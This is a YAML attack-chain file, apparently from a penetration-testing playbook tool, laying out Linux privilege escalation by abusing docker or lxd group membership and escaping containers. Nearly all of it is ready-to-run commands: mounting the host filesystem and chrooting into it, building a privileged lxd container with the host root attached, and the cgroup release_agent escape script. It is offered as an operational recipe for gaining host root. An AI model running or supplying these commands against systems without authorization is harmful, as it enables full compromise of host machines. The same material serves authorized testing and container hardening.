id: docker-breakout
name: "Linux PE — Docker/LXD container & group breakout"
description: >
  Being in the `docker` group is equivalent to root. Same for `lxd`. Once
  inside a container with privileged or shared-fs mounts, the host is one
  command away. This chain covers the three most common patterns.
tags: [linux, priv-esc, docker, lxd, container-breakout]
difficulty: easy

inputs: []

steps:
  - id: check_groups
    name: "Check group membership"
    inline_command: "id; groups"
    notes: |
      `docker` or `lxd` group → instant root (steps below).
      No group? Skip to step 5 (escape from inside the container).

  - id: docker_group_breakout
    name: "User in `docker` group → root on host"
    inline_command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    notes: |
      Mount the host root filesystem inside an alpine container, chroot
      into it → root on the host. Works on any host where the user can
      reach the docker daemon.

  - id: lxd_breakout
    name: "User in `lxd` group → root on host"
    inline_command: |
      # 1) Get a minimal Alpine image:
      wget https://github.com/saghul/lxd-alpine-builder/releases/latest/download/alpine-v3.18-x86_64.tar.gz -O /tmp/alpine.tar.gz
      lxc image import /tmp/alpine.tar.gz --alias alpine
      lxc init alpine pwned -c security.privileged=true
      lxc config device add pwned host disk source=/ path=/mnt/host recursive=true
      lxc start pwned
      lxc exec pwned -- chroot /mnt/host sh

  - id: container_capabilities
    name: "Inside a container — check capabilities & mounts"
    inline_command: "capsh --print 2>/dev/null; mount | grep -E 'cgroup|docker|proc'"
    notes: |
      cap_sys_admin present → many escapes possible (release_agent trick).
      `/proc` from host mounted → write to /proc/sys/kernel/core_pattern.
      Docker socket mounted (`/var/run/docker.sock`) → call back to the
      daemon, run a new container with `-v /:/mnt`.

  - id: privileged_breakout
    name: "Privileged container → release_agent trick"
    inline_command: |
      mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
      mkdir /tmp/cgrp/x
      echo 1 > /tmp/cgrp/x/notify_on_release
      host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
      echo "$host_path/cmd" > /tmp/cgrp/release_agent
      printf '#!/bin/sh\nps > /output' > /cmd
      chmod a+x /cmd
      sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    notes: |
      Classic privileged-container escape. `/output` ends up on the host.

references:
  - title: "Docker group → root"
    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#docker-group"
  - title: "LXD breakout"
    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#lxd-group"
  - title: "Container escape patterns"
    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html"

next_chains:
  - chain: shell-stabilization
    reason: 'Host shells almost always need a TTY upgrade.'
